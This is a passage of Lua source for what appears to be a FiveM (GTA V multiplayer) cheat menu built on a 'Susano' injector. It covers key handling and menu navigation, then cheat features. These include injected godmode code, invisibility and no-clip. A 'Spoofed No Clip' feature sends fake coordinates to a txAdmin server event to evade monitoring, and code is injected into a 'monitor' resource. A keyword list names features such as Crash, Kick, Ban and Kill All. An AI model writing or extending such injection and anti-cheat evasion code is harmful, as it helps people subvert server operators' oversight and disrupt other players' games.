    if not Menu.Visible and not Menu.ShowKeybinds and Menu.LoadingBarAlpha <= 0 and Menu.KeySelectorAlpha <= 0 then
        if Susano.ResetFrame then
            Susano.ResetFrame()
        end
    end
end

Menu.KeyStates = {}
Menu.LastKeyPressTimes = {}

function Menu.IsKeyJustPressed(keyCode)
    if not (Susano and Susano.GetAsyncKeyState) then
        return false
    end

    local now = GetGameTimer()
    if keyCode == 0x0D then
        local lastPressed = Menu.LastKeyPressTimes[keyCode] or 0
        if now - lastPressed < 250 then
            return false
        end
    end

    local down, pressed = Susano.GetAsyncKeyState(keyCode)
    local wasDown = Menu.KeyStates[keyCode] or false

    if down == true then
        Menu.KeyStates[keyCode] = true
    else
        Menu.KeyStates[keyCode] = false
    end

    local triggered = false
    if pressed == true then
        triggered = true
    elseif down == true and not wasDown then
        triggered = true
    end

    if triggered then
        if keyCode == 0x0D then
            Menu.LastKeyPressTimes[keyCode] = now
        end
        return true
    end

    return false
end


Menu.KeyNames = {
    [0x08] = "Backspace", [0x09] = "Tab", [0x0D] = "Enter", [0x10] = "Shift",
    [0x11] = "Ctrl", [0x12] = "Alt", [0x13] = "Pause", [0x14] = "Caps Lock",
    [0x1B] = "ESC", [0x20] = "Space", [0x21] = "Page Up", [0x22] = "Page Down",
    [0x23] = "End", [0x24] = "Home", [0x25] = "Left", [0x26] = "Up",
    [0x27] = "Right", [0x28] = "Down", [0x2D] = "Insert", [0x2E] = "Delete",
    [0x30] = "0", [0x31] = "1", [0x32] = "2", [0x33] = "3", [0x34] = "4",
    [0x35] = "5", [0x36] = "6", [0x37] = "7", [0x38] = "8", [0x39] = "9",
    [0x41] = "A", [0x42] = "B", [0x43] = "C", [0x44] = "D", [0x45] = "E",
    [0x46] = "F", [0x47] = "G", [0x48] = "H", [0x49] = "I", [0x4A] = "J",
    [0x4B] = "K", [0x4C] = "L", [0x4D] = "M", [0x4E] = "N", [0x4F] = "O",
    [0x50] = "P", [0x51] = "Q", [0x52] = "R", [0x53] = "S", [0x54] = "T",
    [0x55] = "U", [0x56] = "V", [0x57] = "W", [0x58] = "X", [0x59] = "Y",
    [0x5A] = "Z", [0x60] = "Numpad 0", [0x61] = "Numpad 1", [0x62] = "Numpad 2",
    [0x63] = "Numpad 3", [0x64] = "Numpad 4", [0x65] = "Numpad 5", [0x66] = "Numpad 6",
    [0x67] = "Numpad 7", [0x68] = "Numpad 8", [0x69] = "Numpad 9",
    [0x6A] = "Multiply", [0x6B] = "Add", [0x6D] = "Subtract", [0x6E] = "Decimal",
    [0x6F] = "Divide", [0x70] = "F1", [0x71] = "F2", [0x72] = "F3", [0x73] = "F4",
    [0x74] = "F5", [0x75] = "F6", [0x76] = "F7", [0x77] = "F8", [0x78] = "F9",
    [0x79] = "F10", [0x7A] = "F11", [0x7B] = "F12",
    [0x90] = "Num Lock", [0x91] = "Scroll Lock",
    [0xA0] = "Left Shift", [0xA1] = "Right Shift", [0xA2] = "Left Ctrl",
    [0xA3] = "Right Ctrl", [0xA4] = "Left Alt", [0xA5] = "Right Alt"
}

function Menu.GetKeyName(keyCode)
    return Menu.KeyNames[keyCode] or ("Key 0x" .. string.format("%02X", keyCode))
end

function Menu.HandleInput()
    if Menu.IsLoading or not Menu.LoadingComplete then
        return
    end

    if Menu.InputOpen then
        return
    end

    if Menu.SelectingBind then
        if not (Susano and Susano.GetAsyncKeyState) then
            return
        end

        if Menu.IsKeyJustPressed(0x0D) then
            if Menu.BindingKey and Menu.BindingItem then
                Menu.BindingItem.bindKey = Menu.BindingKey
                Menu.BindingItem.bindKeyName = Menu.BindingKeyName
                local itemName = Menu.BindingItem.name or "option"
                local savedKeyName = Menu.BindingKeyName
                Menu.SelectingBind = false
                Menu.BindingItem = nil
                Menu.BindingKey = nil
                Menu.BindingKeyName = nil
            end
            return
        end

        local keysToCheck = {
            0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
            0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A,
            0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39,
            0x20, 0x1B, 0x08, 0x09, 0x10, 0x11, 0x12,
            0x25, 0x26, 0x27, 0x28,
            0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B
        }

        for _, keyCode in ipairs(keysToCheck) do
            if keyCode ~= 0x0D then
                local down, pressed = Susano.GetAsyncKeyState(keyCode)
                if down == true or pressed == true then
                    local wasDown = Menu.KeyStates[keyCode] or false
                    if (pressed == true) or (down == true and not wasDown) then
                        Menu.BindingKey = keyCode
                        Menu.BindingKeyName = Menu.GetKeyName(keyCode)
                        Menu.KeyStates[keyCode] = true
                        break
                    end
                    if down == true then
                        Menu.KeyStates[keyCode] = true
                    else
                        Menu.KeyStates[keyCode] = false
                    end
                end
            end
        end
        return
    end

    if Menu.SelectingKey then
        if not (Susano and Susano.GetAsyncKeyState) then
            return
        end

        if Menu.IsKeyJustPressed(0x0D) then
            if Menu.SelectedKey then
                Menu.SelectingKey = false
            end
            return
        end

        local keysToCheck = {
            0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
            0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A,
            0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39,
            0x20, 0x1B, 0x08, 0x09, 0x10, 0x11, 0x12,
            0x25, 0x26, 0x27, 0x28,
            0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B
        }

        for _, keyCode in ipairs(keysToCheck) do
            if keyCode ~= 0x0D then
                local down, pressed = Susano.GetAsyncKeyState(keyCode)
                if down == true or pressed == true then
                    local wasDown = Menu.KeyStates[keyCode] or false
                    if (pressed == true) or (down == true and not wasDown) then
                        Menu.SelectedKey = keyCode
                        Menu.SelectedKeyName = Menu.GetKeyName(keyCode)
                        Menu.KeyStates[keyCode] = true
                        break
                    end
                    if down == true then
                        Menu.KeyStates[keyCode] = true
                    else
                        Menu.KeyStates[keyCode] = false
                    end
                end
            end
        end
        return
    end

    if Susano and Susano.GetAsyncKeyState then
        if Menu.Categories then
            for _, category in ipairs(Menu.Categories) do
                if category and category.hasTabs and category.tabs then
                    for _, tab in ipairs(category.tabs) do
                        if tab and tab.items then
                            for _, item in ipairs(tab.items) do
                                if item and item.bindKey and (item.type == "toggle" or item.type == "action") then
                                    local down, pressed = Susano.GetAsyncKeyState(item.bindKey)
                                    local wasDown = Menu.KeyStates[item.bindKey] or false

                                    if down == true then
                                        Menu.KeyStates[item.bindKey] = true
                                    else
                                        Menu.KeyStates[item.bindKey] = false
                                    end

                                    if (pressed == true) or (down == true and not wasDown) then
                                        if item.type == "toggle" then
                                            item.value = not item.value
                                            if item.name == "Editor Mode" then
                                                Menu.EditorMode = item.value
                                            end
                                            if item.onClick then
                                                item.onClick(item.value)
                                            end

                                        elseif item.type == "action" then
                                            if item.onClick then
                                                item.onClick()
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    local toggleKeyCode = Menu.SelectedKey or 0x31
    if Susano and Susano.GetAsyncKeyState then
        local down, pressed = Susano.GetAsyncKeyState(toggleKeyCode)

        local wasDown = Menu.KeyStates[toggleKeyCode] or false
        local keyPressed = false

        if pressed == true then
            keyPressed = true
        elseif down == true and not wasDown then
            keyPressed = true
        end

        if down == true then
            Menu.KeyStates[toggleKeyCode] = true
        else
            Menu.KeyStates[toggleKeyCode] = false
        end

        if keyPressed then
            local wasVisible = Menu.Visible
            Menu.Visible = not Menu.Visible

            if not wasVisible and Menu.Visible then
            end

            if wasVisible and not Menu.Visible and not Menu.ShowKeybinds then
                if Susano and Susano.ResetFrame then
                    Susano.ResetFrame()
                end
            end
        end
    end

    if not Menu.Visible then
        return
    end

    if Menu.EditorMode then
        local moveSpeed = 8.0
        local screenW = 1920
        local screenH = 1080
        if Susano and Susano.GetScreenWidth and Susano.GetScreenHeight then
            screenW = Susano.GetScreenWidth()
            screenH = Susano.GetScreenHeight()
        end

        if Susano and Susano.GetCursorPos and Susano.GetAsyncKeyState then
            local cursorPos = Susano.GetCursorPos()
            local mouseX = 0
            local mouseY = 0

            if cursorPos then
                if type(cursorPos) == "table" then
                    mouseX = cursorPos[1] or cursorPos.x or 0
                    mouseY = cursorPos[2] or cursorPos.y or 0
                else
                    local xOk, x = pcall(function() return cursorPos.x end)
                    local yOk, y = pcall(function() return cursorPos.y end)
                    if xOk and x then mouseX = x end
                    if yOk and y then mouseY = y end
                end
            end

            local leftMouseDown = false
            if Susano.GetAsyncKeyState then
                local lmbDown, lmbPressed = Susano.GetAsyncKeyState(0x01)
                if lmbDown == true or lmbDown == 1 then
                    leftMouseDown = true
                end
            end

            if not leftMouseDown and (IsControlPressed or IsDisabledControlPressed) then
                if IsDisabledControlPressed and IsDisabledControlPressed(0, 24) then
                    leftMouseDown = true
                elseif IsControlPressed and IsControlPressed(0, 24) then
                    leftMouseDown = true
                end
            end

            local menuX = Menu.Position.x
            local menuY = Menu.Position.y
            local menuWidth = Menu.Position.width

            local totalHeight = Menu.Position.headerHeight
            if Menu.OpenedCategory then
                local category = Menu.Categories[Menu.OpenedCategory]
                if category and category.hasTabs and category.tabs then
                    local currentTab = category.tabs[Menu.CurrentTab]
                    if currentTab and currentTab.items then
                        local maxVisible = Menu.ItemsPerPage
                        local totalItems = #currentTab.items
                        local visibleItems = math.min(maxVisible, totalItems)
                        totalHeight = totalHeight + Menu.Position.mainMenuHeight + Menu.Position.mainMenuSpacing + (visibleItems * Menu.Position.itemHeight)
                    else
                        totalHeight = totalHeight + Menu.Position.mainMenuHeight + Menu.Position.mainMenuSpacing
                    end
                else
                    totalHeight = totalHeight + Menu.Position.mainMenuHeight + Menu.Position.mainMenuSpacing
                end
            else
                local maxVisible = Menu.ItemsPerPage
                local totalCategories = #Menu.Categories - 1
                local visibleCategories = math.min(maxVisible, totalCategories)
                totalHeight = totalHeight + Menu.Position.mainMenuHeight + Menu.Position.mainMenuSpacing + (visibleCategories * Menu.Position.itemHeight)
            end
            totalHeight = totalHeight + Menu.Position.footerSpacing + Menu.Position.footerHeight

            local isOverMenu = (mouseX >= menuX and mouseX <= menuX + menuWidth and
                               mouseY >= menuY and mouseY <= menuY + totalHeight)

            local wasMouseDown = Menu.KeyStates[0x01] or false

            if leftMouseDown then
                if not wasMouseDown and isOverMenu then
                    Menu.EditorDragging = true
                    Menu.EditorDragOffsetX = mouseX - menuX
                    Menu.EditorDragOffsetY = mouseY - menuY
                end

                if Menu.EditorDragging then
                    local newX = mouseX - Menu.EditorDragOffsetX
                    local newY = mouseY - Menu.EditorDragOffsetY

                    local maxX = math.max(0, screenW - menuWidth)
                    local maxY = math.max(0, screenH - totalHeight)

                    Menu.Position.x = math.max(0, math.min(maxX, newX))
                    Menu.Position.y = math.max(0, math.min(maxY, newY))
                end

                Menu.KeyStates[0x01] = true
            else
                Menu.EditorDragging = false
                Menu.KeyStates[0x01] = false
            end
        end

        if Susano and Susano.GetAsyncKeyState then
            local upDown = Susano.GetAsyncKeyState(0x26)
            local downDown = Susano.GetAsyncKeyState(0x28)
            local leftDown = Susano.GetAsyncKeyState(0x25)
            local rightDown = Susano.GetAsyncKeyState(0x27)

            if upDown == true then
                Menu.Position.y = math.max(0, Menu.Position.y - moveSpeed)
            end
            if downDown == true then
                Menu.Position.y = math.min(screenH - 200, Menu.Position.y + moveSpeed)
            end
            if leftDown == true then
                Menu.Position.x = math.max(0, Menu.Position.x - moveSpeed)
            end
            if rightDown == true then
                Menu.Position.x = math.min(screenW - Menu.Position.width, Menu.Position.x + moveSpeed)
            end

            if Menu.IsKeyJustPressed(0x0D) then
                local currentTab = nil
                if Menu.OpenedCategory then
                    local category = Menu.Categories[Menu.OpenedCategory]
                    if category and category.hasTabs and category.tabs then
                        currentTab = category.tabs[Menu.CurrentTab]
                    end
                end
                if currentTab and currentTab.items then
                    for _, item in ipairs(currentTab.items) do
                        if item.name == "Editor Mode" and item.type == "toggle" then
                            item.value = not item.value
                            Menu.EditorMode = item.value
                            break
                        end
                    end
                end
            end
        end
        return
    end

    if Menu.OpenedCategory then
        local category = Menu.Categories[Menu.OpenedCategory]
        if not category or not category.hasTabs or not category.tabs then
            Menu.OpenedCategory = nil
            return
        end

        local currentTab = category.tabs[Menu.CurrentTab]
        if currentTab and currentTab.items then
            if Susano and Susano.GetAsyncKeyState then
                local upDown, upPressed = Susano.GetAsyncKeyState(0x26)
                local downDown, downPressed = Susano.GetAsyncKeyState(0x28)
                local leftDown, leftPressed = Susano.GetAsyncKeyState(0x25)
                local rightDown, rightPressed = Susano.GetAsyncKeyState(0x27)
                local qDown, qPressed = Susano.GetAsyncKeyState(0x51)
                local eDown, ePressed = Susano.GetAsyncKeyState(0x45)
                local backDown, backPressed = Susano.GetAsyncKeyState(0x08)
                local f5Down, f5Pressed = Susano.GetAsyncKeyState(0x74)

                local upWas = Menu.KeyStates[0x26] or false
                local downWas = Menu.KeyStates[0x28] or false
                local leftWas = Menu.KeyStates[0x25] or false
                local rightWas = Menu.KeyStates[0x27] or false
                local qWas = Menu.KeyStates[0x51] or false
                local eWas = Menu.KeyStates[0x45] or false
                local backWas = Menu.KeyStates[0x08] or false
                local f5Was = Menu.KeyStates[0x74] or false

                Menu.KeyStates[0x26] = upDown == true
                Menu.KeyStates[0x28] = downDown == true
                Menu.KeyStates[0x25] = leftDown == true
                Menu.KeyStates[0x27] = rightDown == true
                Menu.KeyStates[0x51] = qDown == true
                Menu.KeyStates[0x45] = eDown == true
                Menu.KeyStates[0x08] = backDown == true
                Menu.KeyStates[0x74] = f5Down == true

                if (f5Pressed == true) or (f5Down == true and not f5Was) then
                    if Menu.CurrentItem > 0 and Menu.CurrentItem <= #currentTab.items then
                        local selectedItem = currentTab.items[Menu.CurrentItem]
                        if selectedItem and not selectedItem.isSeparator then
                            Menu.SelectingBind = true
                            Menu.BindingItem = selectedItem
                            Menu.BindingKey = selectedItem.bindKey or nil
                            Menu.BindingKeyName = selectedItem.bindKeyName or nil
                        end
                    end
                end

                if (upPressed == true) or (upDown == true and not upWas) then
                    Menu.CurrentItem = findNextNonSeparator(currentTab.items, Menu.CurrentItem, -1)

                elseif (downPressed == true) or (downDown == true and not downWas) then
                    Menu.CurrentItem = findNextNonSeparator(currentTab.items, Menu.CurrentItem, 1)

                elseif (qPressed == true) or (qDown == true and not qWas) then
                    if Menu.CurrentTab > 1 then
                        Menu.CurrentTab = Menu.CurrentTab - 1
                        local newTab = category.tabs[Menu.CurrentTab]
                        if newTab and newTab.onOpen then newTab.onOpen(newTab) end
                        if newTab and newTab.items then
                            Menu.CurrentItem = findNextNonSeparator(newTab.items, 0, 1)
                        else
                            Menu.CurrentItem = 1
                        end
                        Menu.ItemScrollOffset = 0
                    end

                elseif (ePressed == true) or (eDown == true and not eWas) then
                    if Menu.CurrentTab < #category.tabs then
                        Menu.CurrentTab = Menu.CurrentTab + 1
                        local newTab = category.tabs[Menu.CurrentTab]
                        if newTab and newTab.onOpen then newTab.onOpen(newTab) end
                        if newTab and newTab.items then
                            Menu.CurrentItem = findNextNonSeparator(newTab.items, 0, 1)
                        else
                            Menu.CurrentItem = 1
                        end
                        Menu.ItemScrollOffset = 0
                    end

                elseif (backPressed == true) or (backDown == true and not backWas) then
                    Menu.OpenedCategory = nil
                    Menu.CurrentItem = 1
                    Menu.CurrentTab = 1
                    Menu.ItemScrollOffset = 0

                elseif (leftPressed == true) or (leftDown == true and not leftWas) then
                    local handled = false
                    if Menu.CurrentItem > 0 and Menu.CurrentItem <= #currentTab.items then
                        local si = currentTab.items[Menu.CurrentItem]
                        if si then
                            if si.type == "slider" then
                                handled = true
                                si.value = math.max(si.min or 0.0, (si.value or si.min or 0.0) - (si.step or 1.0))
                                if si.name == "Smooth Menu" then Menu.SmoothFactor = si.value / 100.0
                                elseif si.name == "Menu Size" then Menu.Scale = si.value / 100.0 end
                            elseif si.type == "toggle" and si.hasSlider then
                                handled = true
                                si.sliderValue = math.max(si.sliderMin or 0.0, (si.sliderValue or si.sliderMin or 0.0) - (si.sliderStep or 0.1))
                                if si.name == "No Clip" then Menu.NoClipSpeed = si.sliderValue
                                elseif si.name == "Freecam" then
                                     Menu.FreecamSpeed = si.sliderValue
                                     if _G.FreeCam and Susano and Susano.Communication and Susano.Communication.Inject then
                                         Susano.Communication.Inject("monitor", string.format("_G.speed = %%f", si.sliderValue))
                                     end
                                end
                            elseif si.type == "toggle_selector" then
                                handled = true
                                local ci = si.selected or 1
                                if si.options and #si.options > 0 then
                                    ci = ci - 1
                                    if ci < 1 then ci = #si.options end
                                end
                                si.selected = ci
                            elseif si.type == "selector" then
                                handled = true
                                local ci = si.selected or 1
                                local isW = false
                                for _, wn in ipairs({"Hat","Mask","Glasses","Torso","Tshirt","Pants","Shoes"}) do
                                    if si.name == wn then isW = true; break end
                                end
                                if isW then ci = math.max(1, ci - 1)
                                else
                                    if si.options and #si.options > 0 then
                                        ci = ci - 1
                                        if ci < 1 then ci = #si.options end
                                    end
                                end
                                si.selected = ci
                                if si.name == "Menu Theme" and si.options then Menu.ApplyTheme(si.options[ci])
                                elseif si.name == "Gradient" and si.options then Menu.GradientType = tonumber(si.options[ci]) or 1
                                elseif si.name == "Scroll Bar Position" and si.options then
                                    if si.options[ci] == "Left" then Menu.ScrollbarPosition = 1
                                    elseif si.options[ci] == "Right" then Menu.ScrollbarPosition = 2 end
                                end
                                if isW and si.onClick then
                                    si.onClick(si.selected, si.options and si.options[si.selected] or nil)
                                end
                            end
                        end
                    end
                    if not handled then
                        if Menu.CurrentTab > 1 then
                            Menu.CurrentTab = Menu.CurrentTab - 1
                            local newTab = category.tabs[Menu.CurrentTab]
                            if newTab and newTab.onOpen then newTab.onOpen(newTab) end
                            if newTab and newTab.items then
                                Menu.CurrentItem = findNextNonSeparator(newTab.items, 0, 1)
                            else Menu.CurrentItem = 1 end
                            Menu.ItemScrollOffset = 0
                        end
                    end

                elseif (rightPressed == true) or (rightDown == true and not rightWas) then
                    local handled = false
                    if Menu.CurrentItem > 0 and Menu.CurrentItem <= #currentTab.items then
                        local si = currentTab.items[Menu.CurrentItem]
                        if si then
                            if si.type == "slider" then
                                handled = true
                                si.value = math.min(si.max or 100.0, (si.value or si.min or 0.0) + (si.step or 1.0))
                                if si.name == "Smooth Menu" then Menu.SmoothFactor = si.value / 100.0
                                elseif si.name == "Menu Size" then Menu.Scale = si.value / 100.0 end
                            elseif si.type == "toggle" and si.hasSlider then
                                handled = true
                                si.sliderValue = math.min(si.sliderMax or 100.0, (si.sliderValue or si.sliderMin or 0.0) + (si.sliderStep or 0.1))
                                if si.name == "No Clip" then Menu.NoClipSpeed = si.sliderValue
                                elseif si.name == "Freecam" then
                                     Menu.FreecamSpeed = si.sliderValue
                                     if _G.FreeCam and Susano and Susano.Communication and Susano.Communication.Inject then
                                         Susano.Communication.Inject("monitor", string.format("_G.speed = %%f", si.sliderValue))
                                     end

                                end
                            elseif si.type == "toggle_selector" then
                                handled = true
                                local ci = si.selected or 1
                                if si.options and #si.options > 0 then
                                    ci = ci + 1
                                    if ci > #si.options then ci = 1 end
                                end
                                si.selected = ci
                            elseif si.type == "selector" then
                                handled = true
                                local ci = si.selected or 1
                                local isW = false
                                for _, wn in ipairs({"Hat","Mask","Glasses","Torso","Tshirt","Pants","Shoes"}) do
                                    if si.name == wn then isW = true; break end
                                end
                                if isW then ci = ci + 1
                                else
                                    if si.options and #si.options > 0 then
                                        ci = ci + 1
                                        if ci > #si.options then ci = 1 end
                                    end
                                end
                                si.selected = ci
                                if si.name == "Menu Theme" and si.options then Menu.ApplyTheme(si.options[ci])
                                elseif si.name == "Gradient" and si.options then Menu.GradientType = tonumber(si.options[ci]) or 1
                                elseif si.name == "Scroll Bar Position" and si.options then
                                    if si.options[ci] == "Left" then Menu.ScrollbarPosition = 1
                                    elseif si.options[ci] == "Right" then Menu.ScrollbarPosition = 2 end
                                end
                                if isW and si.onClick then
                                    si.onClick(si.selected, si.options and si.options[si.selected] or nil)
                                end
                            end
                        end
                    end
                    if not handled then
                        if Menu.CurrentTab < #category.tabs then
                            Menu.CurrentTab = Menu.CurrentTab + 1
                            local newTab = category.tabs[Menu.CurrentTab]
                            if newTab and newTab.onOpen then newTab.onOpen(newTab) end
                            if newTab and newTab.items then
                                Menu.CurrentItem = findNextNonSeparator(newTab.items, 0, 1)
                            else Menu.CurrentItem = 1 end
                            Menu.ItemScrollOffset = 0
                        end
                    end
                end
            end

            if Menu.IsKeyJustPressed(0x0D) then
                local item = currentTab.items[Menu.CurrentItem]
                if item and not item.isSeparator then
                    if item.type == "toggle" or item.type == "toggle_selector" then
                        item.value = not item.value
                        if item.name == "Show Menu Keybinds" then
                            Menu.ShowKeybinds = item.value
                        elseif item.name == "Editor Mode" then
                            Menu.EditorMode = item.value
                        elseif item.name == "Flocon" then
                            Menu.ShowSnowflakes = item.value
                        end
                        if item.onClick then item.onClick(item.value) end
                    elseif item.type == "action" then
                        if item.name == "Change Menu Keybind" then
                            Menu.SelectingKey = true
                            Menu.SelectedKey = Menu.SelectedKey
                            Menu.SelectedKeyName = Menu.SelectedKeyName
                        end
                        if item.onClick then item.onClick() end
                    elseif item.type == "selector" then
                        if item.onClick then
                             local option = (item.options and item.options[item.selected]) or nil
                             item.onClick(item.selected, option)
                        end
                    end
                end
            end
        end
    else
        if Susano and Susano.GetAsyncKeyState then
            local upDown, upPressed = Susano.GetAsyncKeyState(0x26)
            local downDown, downPressed = Susano.GetAsyncKeyState(0x28)
            local leftDown, leftPressed = Susano.GetAsyncKeyState(0x25)
            local rightDown, rightPressed = Susano.GetAsyncKeyState(0x27)
            local backDown, backPressed = Susano.GetAsyncKeyState(0x08)

            local upWas = Menu.KeyStates[0x26] or false
            local downWas = Menu.KeyStates[0x28] or false
            local leftWas = Menu.KeyStates[0x25] or false
            local rightWas = Menu.KeyStates[0x27] or false
            local backWas = Menu.KeyStates[0x08] or false

            Menu.KeyStates[0x26] = upDown == true
            Menu.KeyStates[0x28] = downDown == true
            Menu.KeyStates[0x25] = leftDown == true
            Menu.KeyStates[0x27] = rightDown == true
            Menu.KeyStates[0x08] = backDown == true

            if (upPressed == true) or (upDown == true and not upWas) then
                Menu.CurrentCategory = Menu.CurrentCategory - 1
                if Menu.CurrentCategory < 2 then
                    Menu.CurrentCategory = #Menu.Categories
                end
            elseif (downPressed == true) or (downDown == true and not downWas) then
                Menu.CurrentCategory = Menu.CurrentCategory + 1
                if Menu.CurrentCategory > #Menu.Categories then
                    Menu.CurrentCategory = 2
                end
            elseif (leftPressed == true) or (leftDown == true and not leftWas) then
                if Menu.TopLevelTabs then
                    Menu.CurrentTopTab = Menu.CurrentTopTab - 1
                    if Menu.CurrentTopTab < 1 then Menu.CurrentTopTab = #Menu.TopLevelTabs end
                    Menu.UpdateCategoriesFromTopTab()
                    Menu.CurrentCategory = 2
                end
            elseif (rightPressed == true) or (rightDown == true and not rightWas) then
                if Menu.TopLevelTabs then
                    Menu.CurrentTopTab = Menu.CurrentTopTab + 1
                    if Menu.CurrentTopTab > #Menu.TopLevelTabs then Menu.CurrentTopTab = 1 end
                    Menu.UpdateCategoriesFromTopTab()
                    Menu.CurrentCategory = 2
                end
            elseif (backPressed == true) or (backDown == true and not backWas) then
                Menu.Visible = false
            end
        end

        if Menu.IsKeyJustPressed(0x0D) then
            local category = Menu.Categories[Menu.CurrentCategory]
            if category and category.hasTabs and category.tabs then
                Menu.OpenedCategory = Menu.CurrentCategory
                Menu.CurrentTab = 1
                local firstTab = category.tabs[1]
                if firstTab and firstTab.onOpen then firstTab.onOpen(firstTab) end
                if firstTab and firstTab.items then
                    Menu.CurrentItem = findNextNonSeparator(firstTab.items, 0, 1)
                else
                    Menu.CurrentItem = 1
                end
                Menu.ItemScrollOffset = 0
            end
        end
    end
end


CreateThread(function()
    Menu.LoadingStartTime = GetGameTimer() or 0

    while Menu.IsLoading do
        local currentTime = GetGameTimer() or Menu.LoadingStartTime
        local elapsedTime = currentTime - Menu.LoadingStartTime

        Menu.LoadingProgress = (elapsedTime / Menu.LoadingDuration) * 100.0

        if Menu.LoadingProgress >= 100.0 then
            Menu.LoadingProgress = 100.0
            Menu.IsLoading = false
            Menu.LoadingComplete = true
            Menu.SelectingKey = true
            break
        end

        Wait(0)
    end
end)




-- [!] Risky item indicator
Menu.RiskyKeywords = {
    "Godmode", "Invisible", "No Clip", "Rage Mode", "Force Field",
    "Teleport", "ESP", "Aimbot",
    "Speed Hack", "Explosion", "Crash", "Kick", "Ban",
    "Nuke", "Destroy", "Kill All", "Freeze All"
}

Menu.IsItemRisky = function(itemName)
    if not itemName then return false end
    for _, keyword in ipairs(Menu.RiskyKeywords) do
        if itemName:lower():find(keyword:lower(), 1, true) then
            return true
        end
    end
    return false
end

Menu.TopLevelTabs = {
    {
        name = "MAIN MENU",
        categories = {

            {
                name = "PLAYER",
                hasTabs = true,
                tabs = {
                    {
                        name = "Self",
                        items = {
                            {name = "Godmode", type = "toggle", value = false, onClick = function(state)
                                if state then
                                    Menu.SafeExec([[
                                        local p = PlayerPedId()
                                        local pid = PlayerId()
                                        SetEntityProofs(p, true, true, true, true, true, true, true, true)
                                        SetPedSuffersCriticalHits(p, false)
                                        SetPlayerHealthRechargeMultiplier(pid, 100.0)
                                        SetPedDiesWhenInjured(p, false)
                                        SetEntityHealth(p, GetEntityMaxHealth(p))
                                        SetPedArmour(p, 100)
                                        SetPedCanRagdoll(p, false)
                                        Citizen.CreateThread(function()
                                            while true do
                                                Citizen.Wait(50)
                                                local ped = PlayerPedId()
                                                if GetEntityHealth(ped) < GetEntityMaxHealth(ped) then
                                                    SetEntityHealth(ped, GetEntityMaxHealth(ped))
                                                end
                                                SetPedArmour(ped, 100)
                                            end
                                        end)
                                    ]])
                                else
                                    Menu.SafeExec([[
                                        local p = PlayerPedId()
                                        SetEntityProofs(p, false, false, false, false, false, false, false, false)
                                        SetPedSuffersCriticalHits(p, true)
                                        SetPlayerHealthRechargeMultiplier(PlayerId(), 1.0)
                                        SetPedDiesWhenInjured(p, true)
                                        SetPedCanRagdoll(p, true)
                                    ]])
                                end
                                Menu.GodModeEnabled = state
                                Menu.RegisterFeature("Godmode", state)
                            end},

                            {name = "Invisibility", type = "toggle", value = false, onClick = function(state)
                                SetEntityVisible(PlayerPedId(), not state, false)
                                Menu.RegisterFeature("Invisibility", state)
                            end},

                            {name = "No Clip", type = "toggle", hasSlider = true, sliderMin = 0.5, sliderMax = 10.0, sliderStep = 0.5, sliderValue = Menu.NoClipSpeed or 1.0, onClick = function(state)
                                if state then StartNoClip() else StopNoClip() end
                                Menu.RegisterFeature("No Clip", state)
                            end},

                            {name = "Spoofed No Clip (Fake TX Coords)", type = "toggle", onClick = function(state)
                                Menu.SpoofedNoClipEnabled = state
                                Menu.RegisterFeature("Spoofed No Clip", state)
                                if state then
                                    StartNoClip()
                                    Menu.SpoofedNoClipThread = Citizen.CreateThread(function()
                                        local ped = PlayerPedId()
                                        local startCoords = GetEntityCoords(ped)
                                        while Menu.SpoofedNoClipEnabled do
                                            local fakeX = startCoords.x + (math.random(-200, 200) / 100.0)
                                            local fakeY = startCoords.y + (math.random(-200, 200) / 100.0)
                                            local fakeZ = startCoords.z + (math.random(-50, 50) / 100.0)
                                            Menu.SafeExec(string.format([[TriggerServerEvent('txsv:req:playerPosition', %f, %f, %f)]], fakeX, fakeY, fakeZ))
                                            Citizen.Wait(500)
                                        end
                                    end)
                                else
                                    StopNoClip()
                                    if Menu.SpoofedNoClipThread then
                                        Menu.SpoofedNoClipThread = nil
                                    end
                                end
                            end},

                            {name = "Super Jump", type = "toggle", value = false, onClick = function(state)
                                Menu.SuperJumpEnabled = state
                                Menu.RegisterFeature("Super Jump", state)
                            end},

                            {name = "Infinite Stamina", type = "toggle", value = false, onClick = function(state)
                                Menu.InfiniteStaminaEnabled = state
                                Menu.RegisterFeature("Infinite Stamina", state)
                            end},

                            {name = "Rage Mode", type = "toggle", value = false, onClick = function(state)
                                Menu.RageModeEnabled = state
                                Menu.RegisterFeature("Rage Mode", state)
                                if not state then ClearPedBloodDamage(PlayerPedId()) end
                            end},

                            {isSeparator = true, separatorText = "Health"},

                            {name = "Heal", type = "action", onClick = function()
                                Menu.SafeExec([[SetEntityHealth(PlayerPedId(), GetEntityMaxHealth(PlayerPedId()))]])
                            end},

                            {name = "Max Armor", type = "action", onClick = function()
                                Menu.SafeExec([[SetPedArmour(PlayerPedId(), 100)]])
                            end},

                            {name = "Heal + Armor", type = "action", onClick = function()
                                Menu.SafeExec([[
                                    SetEntityHealth(PlayerPedId(), GetEntityMaxHealth(PlayerPedId()))
                                    SetPedArmour(PlayerPedId(), 100)
                                ]])
                            end},

                            {name = "Suicide", type = "action", onClick = function()
                                Menu.SafeExec([[SetEntityHealth(PlayerPedId(), 0)]])
                            end},

                            {isSeparator = true, separatorText = "Extras"},

                            {name = "Clean Ped", type = "action", onClick = function()
                                local p = PlayerPedId()
                                ClearPedBloodDamage(p)
                                ClearPedWetness(p)
                                ClearPedDecorations(p)
                                ResetPedVisibleDamage(p)
                            end},

                            {name = "Night Vision", type = "toggle", value = false, onClick = function(state)
                                SetNightvision(state)
                            end},

                            {name = "Thermal Vision", type = "toggle", value = false, onClick = function(state)
                                SetSeethrough(state)
                            end},

